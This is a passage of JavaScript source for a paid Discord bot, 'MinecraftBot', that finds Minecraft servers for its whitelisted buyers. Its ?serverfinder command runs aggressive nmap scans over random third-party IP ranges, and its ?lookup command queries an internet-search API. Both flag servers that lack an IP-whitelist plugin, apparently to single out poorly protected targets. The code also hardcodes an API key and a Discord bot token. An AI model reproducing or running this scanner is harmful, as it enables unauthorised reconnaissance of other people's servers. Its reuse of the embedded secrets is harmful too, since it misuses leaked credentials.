                                    .addField(`✠ IPWL:`,"`   YES 😭`")
                                    return message.channel.send(botembed);
                                }catch(e){
                                let botembed = new Discord.MessageEmbed()
                                .setTitle(`>> ${args} | SERVER INFO <<`)
                                .setColor("#17f138")
                                .setThumbnail(favicon)
                                .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                .addField(`✠ IP:`,"`   "+ip+"`")
                                .addField(`✠ PORT:`,"`"   +port+"`")
                                .addField(`✠ MOTD:`,"`"   +motd+"`")
                                .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                .addField(`✠ IPWL:`,"`   YES 😭`")
                                return message.channel.send(botembed);
                                }
    
                            }else{
                                try{
                                    var info = data.info.clean;
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${args} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   version+"`")
                                    .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                    .addField(`✠ IPWL:`,"`   YES 😭`")
                                    return message.channel.send(botembed);
                                }catch (e){
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${args} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   version+"`")
                                    .addField(`✠ IPWL:`,"`   YES 😭`")
                                    return message.channel.send(botembed);
                                }
            
                                }
                        }else{
                            if(software){
                                try{
                                var info = data.info.clean;
                                let botembed = new Discord.MessageEmbed()
                                .setTitle(`>> ${args} | SERVER INFO <<`)
                                .setColor("#17f138")
                                .setThumbnail(favicon)
                                .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                .addField(`✠ IP:`,"`   "+ip+"`")
                                .addField(`✠ PORT:`,"`"   +port+"`")
                                .addField(`✠ MOTD:`,"`"   +motd+"`")
                                .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                .addField(`✠ IPWL:`,"`   NO 🔥`")
                                return message.channel.send(botembed);
                                }catch(e){
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${args} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                    .addField(`✠ IPWL:`,"`   NO 🔥`")
                                    return message.channel.send(botembed);
                                }
    
                                }else{
                                    try{
                                        var info = data.info.clean;
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> ${args} | SERVER INFO <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`   "+ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+   version+"`")
                                        .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                        .addField(`✠ IPWL:`,"`   NO 🔥`")
                                        return message.channel.send(botembed);
                                    }catch (e){
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> ${args} | SERVER INFO <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`   "+ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+    version+"`")
                                        .addField(`✠ IPWL:`,"`   NO 🔥`")
                                        return message.channel.send(botembed);

                                    }
            
                                }

                        }

                    }catch (e){
                        if(software){
                            try{
                                var info = data.info.clean;
                            let botembed = new Discord.MessageEmbed()
                            .setTitle(`>> ${args} | SERVER INFO <<`)
                            .setColor("#17f138")
                            .setThumbnail(favicon)
                            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                            .addField(`✠ IP:`,"`   "+ip+"`")
                            .addField(`✠ PORT:`,"`"   +port+"`")
                            .addField(`✠ MOTD:`,"`"   +motd+"`")
                            .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                            .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                            .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                            return message.channel.send(botembed);
                            }catch(e){
                                let botembed = new Discord.MessageEmbed()
                                .setTitle(`>> ${args} | SERVER INFO <<`)
                                .setColor("#17f138")
                                .setThumbnail(favicon)
                                .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                .addField(`✠ IP:`,"`   "+ip+"`")
                                .addField(`✠ PORT:`,"`"   +port+"`")
                                .addField(`✠ MOTD:`,"`"   +motd+"`")
                                .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                return message.channel.send(botembed);
                            }

                            }else{
                                try{
                                    var info = data.info.clean;
                            let botembed = new Discord.MessageEmbed()
                            .setTitle(`>> ${args} | SERVER INFO <<`)
                            .setColor("#17f138")
                            .setThumbnail(favicon)
                            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                            .addField(`✠ IP:`,"`   "+ip+"`")
                            .addField(`✠ PORT:`,"`"   +port+"`")
                            .addField(`✠ MOTD:`,"`"   +motd+"`")
                            .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                            .addField(`✠ VERSION:`,"`"+   version+"`")
                            .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                            return message.channel.send(botembed);
                                }catch(e){
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${args} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   version+"`")
                                    return message.channel.send(botembed);
                                }
        
                            }
                    
                    }

                }


        
            });

        }else{
            return message.channel.send("Usage ?server {ip}");
        }
    }


    if(cmd === `${prefix}serverfinder`){
        //return message.channel.send("Coming soon. 🔥");
        if(Basic.indexOf(message.author.tag) === -1){      
            console.log(chalk.redBright.bold(`[CONSOLE] > ${message.author.tag} Tried to run ?serverfinder from ${message.guild.name} -> ( ${message.guild.id}).`)); 
            return message.channel.send("⛔️ You are not on the whitelist! ⛔️| MSG ItsJokerz#2779 to buy it.");
        }

        // if(using.indexOf(message.author.tag) === -1){
            
        //     using.push(message.author.tag)
            message.channel.send('👀 Searching servers, please wait.')


            let random = Math.floor(Math.random() * ranges.length) + 1 

            let ip = ranges[random]

            var nmapscan = new nmap.NmapScan(`${ip}0-255`, `-T5  -p T:25565 --disable-arp-ping --open --privileged`);
            console.log(chalk.yellowBright.bold(`[CONSOLE] > [SERVERFINDER] > ${message.author.tag} ServerFinding ${ip}*`))
            nmapscan.on('complete', function(data){
                //console.log(data)
                try{
                    if(!data[0]){
                        using.splice(using.indexOf(message.author.tag))
                        return message.channel.send('Found no servers.')
                    }else{
                    for(var ips in data){
                        try{
                            
                            let resolved_ip = data[ips].ip;
                            let openports = data[ips].openPorts;
                                for(var port in openports){
                                    let puerto = JSON.stringify(openports[port].port)
                                    //console.log('\nFound > ' + resolved_ip + ':' + puerto)
                                    //message.channel.send('❗️ Found > ' + resolved_ip + ':' + puerto)
                                    let ipfound = resolved_ip+':'+puerto
                                    let url =  `https://api.mcsrvstat.us/2/${ipfound}`

                                    request({
                                    url: url,
                                    JSON: true
                                    },(error, response, body) =>{
            
                                    var data2 = JSON.parse(body)
            
                                    var ping = data2.debug.ping;
            
                                            
                            
                                    if(!ping){
                                    
            
                                    }else{
            
                                    let favicon = `https://eu.mc-api.net/v3/server/favicon/${resolved_ip}`
                                    var motd = data2.motd.clean;
                                    var online = data2.players.online;
                                    var max = data2.players.max;
                                    var version = data2.version;
                                    var software = data2.software;
                                
                                    try{
                                        var plugins = data2.plugins.names;
                                        console.log(chalk.yellowBright.bold(`[CONSOLE] > [SERVERFINDER] > ${message.author.tag} found ${ipfound}`))
                                        if(plugins.indexOf("IPWhitelist") > -1 ) {
            
                                            if(software){
                                                    try{
                                                    let botembed = new Discord.MessageEmbed()
                                                    .setTitle(`>> Found ${ipfound}. <<`)
                                                    .setColor("#17f138")
                                                    .setThumbnail(favicon)
                                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                                    .addField(`✠ IP:`,"`"   +resolved_ip+"`")
                                                    .addField(`✠ PORT:`,"`   25565`")
                                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                                    .addField(`✠ VERSION:`,"`"+   software +" → "+ version+"`")
                                                    .addField(`✠ IPWL:`,"`   YES 😭`")
                                                    return message.channel.send(botembed);
                                                    }catch(e){
                                                        console.log(`Error on ip ${ipfound}`)
                                                    }
                                                
                    
                                            }else{
                                                    try{
                                                    let botembed = new Discord.MessageEmbed()
                                                    .setTitle(`>> Found ${ipfound}. <<`)
                                                    .setColor("#17f138")
                                                    .setThumbnail(favicon)
                                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                                    .addField(`✠ IP:`,"`"   +resolved_ip+"`")
                                                    .addField(`✠ PORT:`,"`   25565`")
                                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                                    .addField(`✠ VERSION:`,"`"+   version+"`")
                                                    .addField(`✠ IPWL:`,"`   YES 😭`")
                                                    return message.channel.send(botembed);
                                                    }catch(e){
                                                        console.log(`Error on ip ${ipfound}`)
                                                    }
                                                }
                            
                                                
                                        }else{
                                            if(software){
                                                    try{
                                                    let botembed = new Discord.MessageEmbed()
                                                    .setTitle(`>> Found ${ipfound}. <<`)
                                                    .setColor("#17f138")
                                                    .setThumbnail(favicon)
                                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                                    .addField(`✠ IP:`,"`"   +resolved_ip+"`")
                                                    .addField(`✠ PORT:`,"`   25565`")
                                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                                    .addField(`✠ VERSION:`,"`"+   software +" → "+ version+"`")
                                                    .addField(`✠ IPWL:`,"`   NO 🔥`")
                                                    return message.channel.send(botembed);
                                                }catch(e){
                                                    console.log(`Error on ip ${ipfound}`)
                                                }
                    
                                                }else{
                                                        try{
                                                        let botembed = new Discord.MessageEmbed()
                                                        .setTitle(`>> Found ${ipfound}. <<`)
                                                        .setColor("#17f138")
                                                        .setThumbnail(favicon)
                                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                                        .addField(`✠ IP:`,"`"   +resolved_ip+"`")
                                                        .addField(`✠ PORT:`,"`   25565`")
                                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                                        .addField(`✠ VERSION:`,"`"+   version+"`")
                                                        .addField(`✠ IPWL:`,"`   NO 🔥`")
                                                        return message.channel.send(botembed);
                                                    }catch(e){
                                                        console.log(`Error on ip ${ipfound}`)
                                                    }
            
                                                    }
            
                                        }
            
                                    }catch (e){
                                        console.log(chalk.yellowBright.bold(`[CONSOLE] > [SERVERFINDER] > ${message.author.tag} found ${ipfound}`))
                                        if(software){
                                                try{
                                                let botembed = new Discord.MessageEmbed()
                                                .setTitle(`>> Found ${ipfound}. <<`)
                                                .setColor("#17f138")
                                                .setThumbnail(favicon)
                                                .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                                .addField(`✠ IP:`,"`"   +resolved_ip+"`")
                                                .addField(`✠ PORT:`,"`   25565`")
                                                .addField(`✠ MOTD:`,"`"   +motd+"`")
                                                .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                                .addField(`✠ VERSION:`,"`"+   software +" → "+ version+"`")
                                                return message.channel.send(botembed);
                                            }catch(e){
                                                console.log(`Error on ip ${ipfound}`)
                                                //console.log(e)
                                            }
                                            
            
                                            }else{
                                                    try{
                                                    let botembed = new Discord.MessageEmbed()
                                                    .setTitle(`>> Found ${ipfound}. <<`)
                                                    .setColor("#17f138")
                                                    .setThumbnail(favicon)
                                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                                    .addField(`✠ IP:`,"`"   +resolved_ip+"`")
                                                    .addField(`✠ PORT:`,"`   25565`")
                                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                                    .addField(`✠ VERSION:`,"`"+   version+"`")
                                                    return message.channel.send(botembed);
                                                }catch(e){
                                                    console.log(`Error on ip ${ipfound}`)
                                                    //console.log(e)
                                                }
                                                
                        
                                            }
                                    }
            
                                
                            
                        }
                            });
                                }
                            
                            
                        
                        
                    }catch(e){
                        console.log(e)
                    }
                        }
                    }
                }catch(e){
                    console.log(e)
                }
                message.channel.send("Search finished. ✔️")
                using.splice(using.indexOf(message.author.tag))
            })

            nmapscan.on('error', function(error){
                 console.log(error)
             })
        // }else{
        //     return message.channel.send('⛔️ You are already using a command, wait until the actual one ends. ⛔️')


        // }

    }

 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    if(cmd === `${prefix}lookup`){
        if(Advanced.indexOf(message.author.tag) === -1){      
            console.log(chalk.redBright.bold(`[CONSOLE] > ${message.author.tag} Tried to run ?lookup from ${message.guild.name} -> ( ${message.guild.id}).`)); 
            return message.channel.send("⛔️ You are not on the advanced whitelist! ⛔️| Buy Whitelist at https://shoppy.gg/@MinecraftBot");
        }else{
            

            let query = message.content.slice(8);
            if(query.includes("?")){
                return message.channel.send("Invalid arguments.")
            }
            if(args != null){
                
                const opts = {
                    facets: 'port:25565',
                  };

                const key = 'omnjFY9qZpas7IZZj1JVaNlIBh4E2qpy';

                client.search(`${query}`,key,opts).then(res=>{
                    
                    console.log(chalk.greenBright.bold(`[CONSOLE] > ${message.author.tag} Executed the ?lookup ${query} command from ${message.guild.name} -> ( ${message.guild.id}).`));

                    if(!res.matches[0]){
                        return message.channel.send(`❌ Sorry, there are no results for ${query} ❌`);
                    }else{
                        for(result in res.matches){

                            let org = res.matches[result].org;
                            let country = res.matches[result].location.country_name;
                            if(org === 'Secured Servers LLC' || country === 'China' || country === 'Taiwan' || country === 'Turkey' || country === 'Japan'){

                            }else{
                        let ip = res.matches[result].ip_str;
                        let port = res.matches[result].port;
                        

                        let url =  `https://api.mcsrvstat.us/2/${ip}`

                        request({
                        url: url,
                        JSON: true
                        },(error, response, body) =>{
                        if(!body){}    
                        var data = JSON.parse(body)

                        var ping = data.debug.ping;
                                          
                        if(!ping){
                        

                        }else{

                        let favicon = `https://eu.mc-api.net/v3/server/favicon/${ip}`
                        var motd = data.motd.clean;
                        var online = data.players.online;
                        var max = data.players.max;
                        var version = data.version;
                        var software = data.software;
                    
                        try{
                            var plugins = data.plugins.names;
                            console.log(chalk.yellowBright.bold(`[CONSOLE] > [LOOKUP] > ${message.author.tag} | For ${query} found ${ip}`))
                            if(plugins.indexOf("IPWhitelist") > -1 ) {

                                if(software){
                                        try{
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> Found for ${query}. <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`"+   ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"+   motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"   +online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"   +software+ " → "+ version+"`")
                                        .addField(`✠ IPWL:`,"`   YES 😭`")
                                        .addField(`✠ ORG:`,"`"+   org+"`")
                                        .addField(`✠ COUNTRY:`,"`"   +country+"`")
                                        return message.channel.send(botembed);
                                        }catch(e){
                                            console.log(`Error on ip ${ip}`)
                                        }
                                    
        
                                }else{
                                        try{
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> Found for ${query}. <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`"+   ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"+   motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"   +online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+ version+"`")
                                        .addField(`✠ IPWL:`,"`   YES 😭`")
                                        .addField(`✠ ORG:`,"`"+   org+"`")
                                        .addField(`✠ COUNTRY:`,"`"   +country+"`")
                                        return message.channel.send(botembed);
                                        }catch(e){
                                            console.log(`Error on ip ${ip}`)
                                        }
                                    }
                
                                    
                            }else{
                                if(software){
                                        try{
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> Found for ${query}. <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`"+   ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"+   motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"   +online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"   +software+ " → "+ version+"`")
                                        .addField(`✠ IPWL:`,"`   NO 🔥`")
                                        .addField(`✠ ORG:`,"`"+   org+"`")
                                        .addField(`✠ COUNTRY:`,"`"   +country+"`")
                                        return message.channel.send(botembed);
                                    }catch(e){
                                        console.log(`Error on ip ${ip}`)
                                    }
        
                                    }else{
                                            try{
                                            let botembed = new Discord.MessageEmbed()
                                            .setTitle(`>> Found for ${query}. <<`)
                                            .setColor("#17f138")
                                            .setThumbnail(favicon)
                                            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                            .addField(`✠ IP:`,"`"+   ip+"`")
                                            .addField(`✠ PORT:`,"`"   +port+"`")
                                            .addField(`✠ MOTD:`,"`"+   motd+"`")
                                            .addField(`✠ PLAYERS:`,"`"   +online+"/"+max+"`")
                                            .addField(`✠ VERSION:`,"`"  + version+"`")
                                            .addField(`✠ IPWL:`,"`   NO 🔥`")
                                            .addField(`✠ ORG:`,"`"+   org+"`")
                                            .addField(`✠ COUNTRY:`,"`"   +country+"`")
                                            return message.channel.send(botembed);
                                        }catch(e){
                                            console.log(`Error on ip ${ip}`)
                                        }

                                        }

                            }

                        }catch (e){
                            console.log(chalk.yellowBright.bold(`[CONSOLE] > [LOOKUP] > ${message.author.tag} | For ${query} found ${ip}`))
                            if(software){
                                    try{
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> Found for ${query}. <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`"+   ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"+   motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"   +online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"   +software+ " → "+ version+"`")
                                    .addField(`✠ ORG:`,"`"+   org+"`")
                                    .addField(`✠ COUNTRY:`,"`"   +country+"`")
                                    return message.channel.send(botembed);
                                }catch(e){
                                    console.log(`Error on ip ${ip}`)
                                }
                                

                                }else{
                                        try{
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> Found for ${query}. <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`"+   ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"+   motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"   +online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"   + version+"`")
                                        .addField(`✠ ORG:`,"`"+   org+"`")
                                        .addField(`✠ COUNTRY:`,"`"   +country+"`")
                                        return message.channel.send(botembed);
                                    }catch(e){
                                        console.log(`Error on ip ${ip}`)
                                    }
                                    
            
                                }
                        }

                    
                
            }
                });
                     
                   

                  }
                 }
                 
                }
                
                })
            }else{
                return message.channel.send("Usage ?lookup {version / motd}");

            }

    }

    }
    
    if(cmd === `${prefix}serverlist`){
        if(message.author.tag === 'ItsJokerz#2779'){
            let list = []
            let servers = bot.guilds.array()
            console.log(chalk.magentaBright.bold(`>> MinecraftBot is actually running on ${bot.guilds.size} servers <<`))
            for(let server in servers){
            let name = servers[server].name
            let members = servers[server].memberCount
            //console.log(`>> ${name} with ${members} members.`)
            list.push(`>> ${name} with ${members} members.\n`)

        }

        let listaxd = String(list).replace(/,/g, '')
        console.log(chalk.magenta.bold(listaxd))
            

        }else{
            return message.channel.send("You are not an adminstrator sorry.")
        }
    }

            
});

bot.login('ODA5NTg2MTUyOTc3NzI3NTg4.YCXP3A.SSeT7ZINXPp1GbSHVQooi45HeAI');